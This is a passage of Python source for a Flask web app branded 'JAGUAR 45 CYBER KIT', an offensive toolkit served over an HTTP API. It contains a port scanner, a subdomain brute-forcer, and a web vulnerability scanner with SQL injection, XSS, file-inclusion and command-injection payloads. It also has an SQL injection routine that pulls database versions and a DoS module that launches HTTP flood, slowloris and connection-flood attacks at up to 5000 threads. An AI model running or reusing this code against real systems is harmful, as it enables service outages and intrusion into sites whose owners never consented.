    # ==================== PORT SCANNING ====================
    
    def port_scan(self, target, scan_type='quick', custom_ports=None, threads=200):
        """Advanced port scanning"""
        scan_id = self.generate_id('portscan')
        self.active_scans[scan_id] = {
            'type': 'portscan',
            'target': target,
            'start': time.time(),
            'status': 'running'
        }
        
        try:
            start_time = time.time()
            
            # Resolve target
            try:
                ip = socket.gethostbyname(target)
            except:
                ip = target
            
            # Determine ports to scan
            if scan_type == 'quick':
                ports = list(range(1, 1024))  # Well-known ports
            elif scan_type == 'common':
                ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
                        3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017, 9200,
                        11211, 27017, 28017, 5000, 5001, 8000, 8008, 8081, 8443,
                        8888, 9000, 9001, 9042, 9092, 9200, 9300, 11211, 27017]
            elif scan_type == 'full':
                ports = list(range(1, 1001))
            elif scan_type == 'stealth':
                ports = list(range(1, 1024))
            elif scan_type == 'udp':
                ports = [53, 67, 68, 69, 123, 137, 138, 139, 161, 162, 500, 514]
            elif scan_type == 'aggressive':
                ports = list(range(1, 10001))
            elif custom_ports:
                if '-' in custom_ports:
                    start, end = map(int, custom_ports.split('-'))
                    ports = list(range(start, end + 1))
                elif ',' in custom_ports:
                    ports = list(map(int, custom_ports.split(',')))
                else:
                    ports = list(range(1, 1024))
            else:
                ports = list(range(1, 1024))
            
            open_ports = []
            
            def scan_tcp_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    
                    if scan_type == 'stealth':
                        # TCP SYN scan simulation
                        sock.settimeout(0.5)
                    
                    result = sock.connect_ex((ip, port))
                    
                    if result == 0:
                        # Get banner
                        banner = ''
                        try:
                            sock.settimeout(2)
                            if port in [80, 443, 8080, 8443]:
                                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').split('\n')[0]
                            elif port == 21:
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                            elif port == 22:
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                            elif port == 25:
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                            elif port == 110:
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                        except:
                            pass
                        
                        service = self.get_service_name(port)
                        open_ports.append({
                            'port': port,
                            'protocol': 'tcp',
                            'service': service,
                            'banner': banner[:100],
                            'status': 'open'
                        })
                    
                    sock.close()
                except:
                    pass
            
            # Scan with high concurrency
            max_workers = min(threads, 500)
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Process in chunks to avoid memory issues
                chunk_size = 100
                for i in range(0, len(ports), chunk_size):
                    chunk = ports[i:i + chunk_size]
                    executor.map(scan_tcp_port, chunk)
            
            scan_time = round(time.time() - start_time, 2)
            
            del self.active_scans[scan_id]
            self.stats['total_scans'] += 1
            self.stats['ports_found'] += len(open_ports)
            
            return {
                'target': target,
                'ip': ip,
                'open_ports': sorted(open_ports, key=lambda x: x['port']),
                'scan_time': scan_time,
                'total_ports_scanned': len(ports),
                'status': 'completed'
            }
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return {'error': str(e), 'status': 'failed'}
    
    # ==================== SUBDOMAIN ENUMERATION ====================
    
    def find_subdomains(self, domain, method='brute', wordlist='medium'):
        """Find subdomains using various techniques"""
        scan_id = self.generate_id('subdomain')
        self.active_scans[scan_id] = {
            'type': 'subdomain',
            'target': domain,
            'start': time.time(),
            'status': 'running'
        }
        
        try:
            subdomains = set()
            
            # Built-in wordlists
            if wordlist == 'small':
                wordlist_data = ['www', 'mail', 'ftp', 'admin', 'webmail', 'portal', 
                               'api', 'blog', 'test', 'dev', 'staging']
            elif wordlist == 'medium':
                wordlist_data = ['www', 'mail', 'ftp', 'admin', 'webmail', 'portal',
                               'api', 'blog', 'test', 'dev', 'staging', 'secure',
                               'vpn', 'ssh', 'remote', 'cpanel', 'whm', 'webdisk',
                               'ns1', 'ns2', 'dns', 'mx', 'mx1', 'mx2', 'static',
                               'cdn', 'assets', 'media', 'images', 'app', 'apps',
                               'shop', 'store', 'support', 'help', 'status', 'monitor']
            else:  # large
                wordlist_data = ['www', 'mail', 'ftp', 'admin', 'webmail', 'portal',
                               'api', 'blog', 'test', 'dev', 'staging', 'secure',
                               'vpn', 'ssh', 'remote', 'cpanel', 'whm', 'webdisk',
                               'ns1', 'ns2', 'dns', 'mx', 'mx1', 'mx2', 'static',
                               'cdn', 'assets', 'media', 'images', 'app', 'apps',
                               'shop', 'store', 'support', 'help', 'status', 'monitor',
                               'dashboard', 'panel', 'control', 'manager', 'system',
                               'server', 'client', 'customer', 'user', 'account',
                               'login', 'signin', 'register', 'auth', 'oauth',
                               'payment', 'pay', 'billing', 'invoice', 'download',
                               'upload', 'file', 'files', 'doc', 'docs', 'wiki',
                               'knowledgebase', 'kb', 'forum', 'forums', 'community',
                               'chat', 'support', 'helpdesk', 'ticket', 'tickets']
            
            # Add numbered variations
            numbered = []
            for word in wordlist_data:
                for i in range(1, 10):
                    numbered.append(f"{word}{i}")
            wordlist_data.extend(numbered)
            
            # Check each subdomain
            def check_subdomain(sub):
                full_domain = f"{sub}.{domain}"
                try:
                    socket.gethostbyname(full_domain)
                    subdomains.add(full_domain)
                except:
                    pass
            
            # Use threading for speed
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                executor.map(check_subdomain, wordlist_data)
            
            # Also check common patterns without wordlist
            patterns = ['admin', 'test', 'dev', 'staging', 'api', 'mail']
            for pattern in patterns:
                check_subdomain(pattern)
            
            del self.active_scans[scan_id]
            
            return {
                'domain': domain,
                'method': method,
                'subdomains': list(subdomains),
                'count': len(subdomains),
                'status': 'completed'
            }
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return {'error': str(e), 'status': 'failed'}
    
    # ==================== VULNERABILITY SCANNING ====================
    
    def vulnerability_scan(self, target, depth='standard', checks=None):
        """Comprehensive vulnerability scanning"""
        if checks is None:
            checks = {}
        
        scan_id = self.generate_id('vulnscan')
        self.active_scans[scan_id] = {
            'type': 'vulnscan',
            'target': target,
            'start': time.time(),
            'status': 'running'
        }
        
        try:
            start_time = time.time()
            vulnerabilities = []
            
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            # Test connection and get baseline
            try:
                response = requests.get(target, timeout=10, verify=False, allow_redirects=True)
                base_response = response
            except Exception as e:
                del self.active_scans[scan_id]
                return {'error': f'Cannot connect to target: {str(e)}', 'status': 'failed'}
            
            # SQL Injection
            if checks.get('sqli', True):
                sqli_vulns = self.test_sql_injection(target)
                vulnerabilities.extend(sqli_vulns)
            
            # XSS
            if checks.get('xss', True):
                xss_vulns = self.test_xss(target)
                vulnerabilities.extend(xss_vulns)
            
            # LFI/RFI
            if checks.get('lfi', True):
                lfi_vulns = self.test_lfi(target)
                vulnerabilities.extend(lfi_vulns)
            
            # Command Injection
            if checks.get('cmdi', True):
                cmdi_vulns = self.test_cmdi(target)
                vulnerabilities.extend(cmdi_vulns)
            
            # Security Headers
            if checks.get('headers', True):
                header_vulns = self.check_security_headers(target)
                vulnerabilities.extend(header_vulns)
            
            # SSL/TLS
            if checks.get('ssl', True) and target.startswith('https://'):
                ssl_vulns = self.test_ssl(target)
                vulnerabilities.extend(ssl_vulns)
            
            scan_time = round(time.time() - start_time, 2)
            
            del self.active_scans[scan_id]
            self.stats['total_scans'] += 1
            self.stats['vulnerabilities_found'] += len(vulnerabilities)
            
            return {
                'target': target,
                'vulnerabilities': vulnerabilities,
                'count': len(vulnerabilities),
                'scan_time': scan_time,
                'status': 'completed'
            }
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return {'error': str(e), 'status': 'failed'}
    
    def test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Parse URL for parameters
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        # SQLi payloads
        payloads = [
            "'", "\"", "1'", "1\"",
            "1' OR '1'='1", "1' OR '1'='2",
            "' OR '1'='1", "' OR '1'='2",
            "1' OR '1'='1' --", "1' OR '1'='1' #",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--", "' UNION SELECT @@version--",
            "' AND SLEEP(5)--", "' OR SLEEP(5)--",
            "' AND 1=CONVERT(int, @@version)--"
        ]
        
        for param in params:
            original_value = params[param][0]
            
            for payload in payloads[:10]:  # Limit for performance
                try:
                    # Replace parameter value
                    test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                    
                    # Send request
                    start_time = time.time()
                    response = requests.get(test_url, timeout=5, verify=False)
                    response_time = time.time() - start_time
                    
                    # Check for SQL errors
                    error_indicators = [
                        'sql', 'syntax', 'mysql', 'postgresql',
                        'oracle', 'database', 'query failed',
                        'sqlite', 'microsoft odbc', 'driver',
                        'invalid query', 'unclosed quotation',
                        'you have an error', 'warning:', 'mysql_fetch',
                        'pg_', 'ora_', 'mssql_'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        vulnerabilities.append({
                            'title': 'SQL Injection Vulnerability',
                            'description': f'Parameter "{param}" is vulnerable to SQL injection',
                            'severity': 'critical',
                            'type': 'sqli',
                            'payload': payload,
                            'parameter': param,
                            'remediation': 'Use parameterized queries or prepared statements'
                        })
                        break
                    
                    # Check for time-based SQLi
                    if response_time > 4:  # Significant delay
                        vulnerabilities.append({
                            'title': 'Time-Based SQL Injection',
                            'description': f'Parameter "{param}" may be vulnerable to time-based SQLi',
                            'severity': 'high',
                            'type': 'sqli',
                            'payload': payload,
                            'parameter': param,
                            'remediation': 'Use parameterized queries or prepared statements'
                        })
                        break
                        
                except:
                    continue
        
        return vulnerabilities
    
    def test_xss(self, url):
        """Test for XSS vulnerabilities"""
        vulnerabilities = []
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        for param in params:
            original_value = params[param][0]
            
            for payload in payloads:
                try:
                    test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Check if payload appears in response
                    if payload in response.text:
                        vulnerabilities.append({
                            'title': 'Cross-Site Scripting (XSS)',
                            'description': f'Parameter "{param}" reflects user input without proper sanitization',
                            'severity': 'high',
                            'type': 'xss',
                            'payload': payload,
                            'parameter': param,
                            'remediation': 'Implement proper input validation and output encoding'
                        })
                        break
                        
                except:
                    continue
        
        return vulnerabilities
    
    def test_lfi(self, url):
        """Test for LFI/RFI vulnerabilities"""
        vulnerabilities = []
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        # LFI payloads
        payloads = [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "../../../../windows/win.ini",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        for param in params:
            original_value = params[param][0]
            
            for payload in payloads:
                try:
                    test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Check for file contents
                    if 'root:' in response.text or '[fonts]' in response.text or '<?php' in response.text:
                        vulnerabilities.append({
                            'title': 'Local File Inclusion (LFI)',
                            'description': f'Parameter "{param}" allows reading of local files',
                            'severity': 'high',
                            'type': 'lfi',
                            'payload': payload,
                            'parameter': param,
                            'remediation': 'Validate and sanitize file path inputs'
                        })
                        break
                        
                except:
                    continue
        
        return vulnerabilities
    
    def test_cmdi(self, url):
        """Test for command injection vulnerabilities"""
        vulnerabilities = []
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        # Command injection payloads
        payloads = [
            ";ls", "|ls", "||ls", "&&ls",
            ";id", "|id", "||id", "&&id",
            "$(ls)", "`ls`"
        ]
        
        # Time-based payloads
        time_payloads = [
            ";sleep 5", "|sleep 5", "||sleep 5", "&&sleep 5"
        ]
        
        for param in params:
            original_value = params[param][0]
            
            # Test regular command injection
            for payload in payloads:
                try:
                    test_url = url.replace(f"{param}={original_value}", f"{param}=127.0.0.1{payload}")
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    if 'bin' in response.text or 'root' in response.text or 'uid=' in response.text:
                        vulnerabilities.append({
                            'title': 'Command Injection',
                            'description': f'Parameter "{param}" allows command execution',
                            'severity': 'critical',
                            'type': 'cmdi',
                            'payload': payload,
                            'parameter': param,
                            'remediation': 'Use proper input validation and avoid system() calls'
                        })
                        break
                        
                except:
                    continue
            
            # Test time-based command injection
            for payload in time_payloads:
                try:
                    test_url = url.replace(f"{param}={original_value}", f"{param}=127.0.0.1{payload}")
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10, verify=False)
                    response_time = time.time() - start_time
                    
                    if response_time > 4:
                        vulnerabilities.append({
                            'title': 'Time-Based Command Injection',
                            'description': f'Parameter "{param}" may be vulnerable to command injection',
                            'severity': 'high',
                            'type': 'cmdi',
                            'payload': payload,
                            'parameter': param,
                            'remediation': 'Use proper input validation and avoid system() calls'
                        })
                        break
                        
                except:
                    continue
        
        return vulnerabilities
    
    def check_security_headers(self, url):
        """Check for security headers"""
        vulnerabilities = []
        
        try:
            response = requests.get(url, timeout=5, verify=False)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                'X-Frame-Options': 'Prevents clickjacking attacks',
                'X-Content-Type-Options': 'Prevents MIME type sniffing',
                'X-XSS-Protection': 'Provides XSS protection',
                'Content-Security-Policy': 'Prevents XSS and other code injection attacks',
                'Strict-Transport-Security': 'Enforces HTTPS connections',
                'Referrer-Policy': 'Controls referrer information',
                'Feature-Policy': 'Controls browser features',
                'Permissions-Policy': 'Controls browser permissions'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    vulnerabilities.append({
                        'title': f'Missing Security Header: {header}',
                        'description': description,
                        'severity': 'medium',
                        'type': 'headers',
                        'remediation': f'Add {header} header to server configuration'
                    })
        
        except:
            pass
        
        return vulnerabilities
    
    def test_ssl(self, url):
        """Test SSL/TLS configuration"""
        vulnerabilities = []
        
        try:
            parsed = urllib.parse.urlparse(url)
            hostname = parsed.hostname
            port = parsed.port or 443
            
            # Create SSL context
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    not_after = cert['notAfter']
                    expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_remaining = (expiry_date - datetime.now()).days
                    
                    if days_remaining < 30:
                        vulnerabilities.append({
                            'title': 'SSL Certificate Expiring Soon',
                            'description': f'Certificate expires in {days_remaining} days',
                            'severity': 'medium',
                            'type': 'ssl',
                            'remediation': 'Renew SSL certificate'
                        })
                    
                    # Check SSL version
                    cipher = ssock.cipher()
                    if cipher:
                        ssl_version = cipher[1]
                        if ssl_version in ['SSLv2', 'SSLv3']:
                            vulnerabilities.append({
                                'title': 'Weak SSL Protocol',
                                'description': f'Using deprecated protocol: {ssl_version}',
                                'severity': 'high',
                                'type': 'ssl',
                                'remediation': 'Disable weak SSL protocols (SSLv2, SSLv3)'
                            })
        
        except ssl.SSLError as e:
            vulnerabilities.append({
                'title': 'SSL/TLS Error',
                'description': str(e),
                'severity': 'medium',
                'type': 'ssl'
            })
        except:
            pass
        
        return vulnerabilities
    
    # ==================== SQL INJECTION EXPLOITATION ====================
    
    def sql_injection(self, target, injection_type='error', db_type='auto', level='detection'):
        """Advanced SQL injection testing and exploitation"""
        scan_id = self.generate_id('sqli')
        self.active_scans[scan_id] = {
            'type': 'sqli',
            'target': target,
            'start': time.time(),
            'status': 'running'
        }
        
        try:
            result = {
                'vulnerable': False,
                'payload': None,
                'database': None,
                'tables': [],
                'data': {},
                'level': level
            }
            
            # Parse URL
            parsed = urllib.parse.urlparse(target)
            params = urllib.parse.parse_qs(parsed.query)
            
            if not params:
                del self.active_scans[scan_id]
                result['error'] = 'No parameters found in URL'
                return result
            
            # Test each parameter
            for param in params:
                original_value = params[param][0]
                
                # Test payloads based on injection type
                if injection_type == 'error':
                    payloads = ["'", "\"", "1'", "1\""]
                elif injection_type == 'boolean':
                    payloads = ["1' AND '1'='1", "1' AND '1'='2"]
                elif injection_type == 'time':
                    payloads = ["1' AND SLEEP(5)--", "1' OR SLEEP(5)--"]
                elif injection_type == 'union':
                    payloads = ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"]
                else:
                    payloads = ["'"]
                
                for payload in payloads:
                    try:
                        test_url = target.replace(f"{param}={original_value}", f"{param}={payload}")
                        start_time = time.time()
                        response = requests.get(test_url, timeout=10, verify=False)
                        response_time = time.time() - start_time
                        
                        # Check for SQL errors
                        error_indicators = [
                            'sql', 'syntax', 'mysql', 'postgresql',
                            'oracle', 'database', 'query failed'
                        ]
                        
                        if any(indicator in response.text.lower() for indicator in error_indicators):
                            result['vulnerable'] = True
                            result['payload'] = payload
                            result['parameter'] = param
                            
                            # Try to identify database
                            if 'mysql' in response.text.lower():
                                result['database'] = 'MySQL'
                            elif 'postgres' in response.text.lower():
                                result['database'] = 'PostgreSQL'
                            elif 'oracle' in response.text.lower():
                                result['database'] = 'Oracle'
                            elif 'microsoft' in response.text.lower() or 'sql server' in response.text.lower():
                                result['database'] = 'Microsoft SQL Server'
                            elif 'sqlite' in response.text.lower():
                                result['database'] = 'SQLite'
                            
                            break
                        
                        # Check for time-based injection
                        if injection_type == 'time' and response_time > 4:
                            result['vulnerable'] = True
                            result['payload'] = payload
                            result['parameter'] = param
                            break
                        
                        # Check for boolean-based injection
                        if injection_type == 'boolean':
                            # Would need to compare responses
                            pass
                            
                    except:
                        continue
                
                if result['vulnerable']:
                    break
            
            # If vulnerable and level is higher than detection, try to extract data
            if result['vulnerable'] and level in ['enumeration', 'extraction', 'full']:
                # Try to extract database version
                version_payloads = {
                    'MySQL': "' UNION SELECT @@version,NULL--",
                    'PostgreSQL': "' UNION SELECT version(),NULL--",
                    'Microsoft SQL Server': "' UNION SELECT @@version,NULL--",
                    'Oracle': "' UNION SELECT banner,NULL FROM v$version--"
                }
                
                db = result.get('database', 'MySQL')
                if db in version_payloads:
                    try:
                        payload = version_payloads[db]
                        test_url = target.replace(f"{result['parameter']}={params[result['parameter']][0]}", 
                                                f"{result['parameter']}={payload}")
                        response = requests.get(test_url, timeout=10, verify=False)
                        # Extract version from response (simplified)
                        result['version'] = 'Extracted (check response)'
                    except:
                        pass
            
            del self.active_scans[scan_id]
            self.stats['total_scans'] += 1
            if result['vulnerable']:
                self.stats['vulnerabilities_found'] += 1
            
            return result
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return {'error': str(e), 'status': 'failed'}
    
    # ==================== DoS ATTACKS ====================
    
    def dos_attack(self, target, attack_type='http', power='medium', duration=60):
        """Launch DoS/DDoS attack"""
        attack_id = f"dos_{self.attack_counter}_{int(time.time())}"
        self.attack_counter += 1
        
        # Calculate threads based on power
        if power == 'low':
            threads = 100
        elif power == 'medium':
            threads = 500
        elif power == 'high':
            threads = 1000
        else:  # extreme
            threads = 5000
        
        self.active_attacks[attack_id] = {
            'type': attack_type,
            'target': target,
            'threads': threads,
            'duration': duration,
            'start': time.time(),
            'status': 'running',
            'requests': 0
        }
        
        # Parse target
        parsed = urllib.parse.urlparse(target if '://' in target else f'http://{target}')
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        path = parsed.path or '/'
        
        # Start attack in background thread
        def run_attack():
            requests_sent = 0
            start_time = time.time()
            end_time = start_time + duration
            
            if attack_type == 'http':
                # HTTP flood attack
                while time.time() < end_time and self.active_attacks.get(attack_id, {}).get('status') == 'running':
                    try:
                        # Send multiple request types
                        for i in range(min(threads, 100)):
                            try:
                                requests.get(target, timeout=1, verify=False)
                                requests_sent += 1
                            except:
                                pass
                            
                            try:
                                requests.post(target, data={'attack': 'jaguar45'}, timeout=1, verify=False)
                                requests_sent += 1
                            except:
                                pass
                    except:
                        pass
            
            elif attack_type == 'slowloris':
                # Slowloris attack
                sockets = []
                try:
                    # Create many slow connections
                    for i in range(min(threads, 200)):
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(5)
                            sock.connect((host, port))
                            
                            # Send partial HTTP request
                            request = f"POST {path} HTTP/1.1\r\n"
                            request += f"Host: {host}\r\n"
                            request += "User-Agent: Jaguar45-CyberKit\r\n"
                            request += "Content-Length: 1000000\r\n"
                            request += "\r\n"
                            sock.send(request.encode())
                            sockets.append(sock)
                            requests_sent += 1
                        except:
                            pass
                    
                    # Keep connections open
                    while time.time() < end_time and self.active_attacks.get(attack_id, {}).get('status') == 'running':
                        time.sleep(1)
                
                finally:
                    # Close sockets
                    for sock in sockets:
                        try:
                            sock.close()
                        except:
                            pass
            
            elif attack_type == 'syn':
                # SYN flood (simulated)
                while time.time() < end_time and self.active_attacks.get(attack_id, {}).get('status') == 'running':
                    try:
                        for i in range(min(threads, 100)):
                            try:
                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                sock.settimeout(0.1)
                                sock.connect((host, port))
                                sock.close()
                                requests_sent += 1
                            except:
                                pass
                    except:
                        pass
            
            # Update attack status
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['requests'] = requests_sent
                self.active_attacks[attack_id]['status'] = 'completed'
                self.active_attacks[attack_id]['end'] = time.time()
            
            self.stats['successful_attacks'] += 1
        
        # Start attack thread
        import threading
        thread = threading.Thread(target=run_attack)
        thread.daemon = True
        thread.start()
        
        return attack_id
    
    # ==================== UTILITY METHODS ====================
    
    def get_service_name(self, port):
        """Get service name for port"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 6379: 'Redis',
            27017: 'MongoDB', 9200: 'Elasticsearch',
            11211: 'Memcached', 2049: 'NFS', 5900: 'VNC',
            8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt',
            9000: 'SonarQube', 9090: 'Prometheus'
        }
        return services.get(port, 'Unknown')
    
    def get_stats(self):
        """Get current statistics"""
        return {
            'active_scans': len(self.active_scans),
            'active_attacks': len([a for a in self.active_attacks.values() if a.get('status') == 'running']),
            'total_scans': self.stats['total_scans'],
            'vulnerabilities_found': self.stats['vulnerabilities_found'],
            'ports_found': self.stats['ports_found'],
            'successful_attacks': self.stats['successful_attacks']
        }
    
    def stop_scan(self, scan_type):
        """Stop all scans of a specific type"""
        stopped = 0
        to_stop = []
        
        for scan_id, scan_info in list(self.active_scans.items()):
            if scan_info['type'] == scan_type:
                to_stop.append(scan_id)
        
        for scan_id in to_stop:
            del self.active_scans[scan_id]
            stopped += 1
        
        return {'stopped': stopped}
    
    def stop_attack(self, attack_type='dos'):
        """Stop all attacks"""
        stopped = 0
        
        for attack_id, attack_info in list(self.active_attacks.items()):
            if attack_info['type'] == attack_type:
                attack_info['status'] = 'stopped'
                stopped += 1
        
        return {'stopped': stopped}
    
    def stop_all(self):
        """Stop all operations"""
        scans_stopped = len(self.active_scans)
        attacks_stopped = 0
        
        self.active_scans.clear()
        
        for attack_id in self.active_attacks:
            self.active_attacks[attack_id]['status'] = 'stopped'
            attacks_stopped += 1
        
        return {
            'scans_stopped': scans_stopped,
            'attacks_stopped': attacks_stopped
        }

# Initialize toolkit
toolkit = Jaguar45CyberKit()

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    return HTML

@app.route('/api/recon', methods=['POST'])
def api_recon():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        result = toolkit.reconnaissance(
            data.get('target', ''),
            data.get('options', {})
        )
        return jsonify(toolkit.safe_json(result))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/portscan', methods=['POST'])
def api_portscan():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        result = toolkit.port_scan(
            data.get('target', ''),
            data.get('type', 'quick'),
            data.get('customPorts'),
            data.get('threads', 200)
        )
        return jsonify(toolkit.safe_json(result))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/subdomain', methods=['POST'])
def api_subdomain():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        result = toolkit.find_subdomains(
            data.get('domain', ''),
            data.get('method', 'brute'),
            data.get('wordlist', 'medium')
        )
        return jsonify(toolkit.safe_json(result))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/vulnscan', methods=['POST'])
def api_vulnscan():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        result = toolkit.vulnerability_scan(
            data.get('target', ''),
            data.get('depth', 'standard'),
            data.get('checks', {})
        )
        return jsonify(toolkit.safe_json(result))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/sqli', methods=['POST'])
def api_sqli():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        result = toolkit.sql_injection(
            data.get('target', ''),
            data.get('type', 'error'),
            data.get('db', 'auto'),
            data.get('level', 'detection')
        )
        return jsonify(toolkit.safe_json(result))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/dos', methods=['POST'])
def api_dos():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        attack_id = toolkit.dos_attack(
            data.get('target', ''),
            data.get('type', 'http'),
            data.get('power', 'medium'),
            data.get('duration', 60)
        )
        return jsonify({'attack_id': attack_id, 'message': 'Attack started'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/attack-status/<attack_id>', methods=['GET'])
def api_attack_status(attack_id):
    try:
        if attack_id in toolkit.active_attacks:
            return jsonify(toolkit.safe_json(toolkit.active_attacks[attack_id]))
        return jsonify({'error': 'Attack not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def api_stats():
    try:
        return jsonify(toolkit.safe_json(toolkit.get_stats()))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop/<scan_type>', methods=['POST'])
def api_stop(scan_type):
    try:
        result = toolkit.stop_scan(scan_type)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop/dos', methods=['POST'])
def api_stop_dos():
    try:
        result = toolkit.stop_attack('dos')
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop/all', methods=['POST'])
def api_stop_all():
    try:
        result = toolkit.stop_all()
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def api_health():
    return jsonify({
        'status': 'online',
        'version': 'JAGUAR 45 CYBER KIT v4.5',
        'timestamp': datetime.now().isoformat()
    })

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

@app.errorhandler(400)
def bad_request(error):
    return jsonify({'error': 'Bad request'}), 400

# ==================== MAIN ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"""
    ╔══════════════════════════════════════════════════════════╗
    ║            JAGUAR 45 CYBER KIT v4.5                      ║
    ║            Ultimate Security Toolkit                      ║
    ║            Charlie Syllas & Jaguar 45 ©2026              ║
    ║                                                          ║
    ║    🚀 Starting on: http://0.0.0.0:{port}                 ║
    ║    ⚡ High-speed security operations ready               ║
    ║    🔒 For authorized testing only                        ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
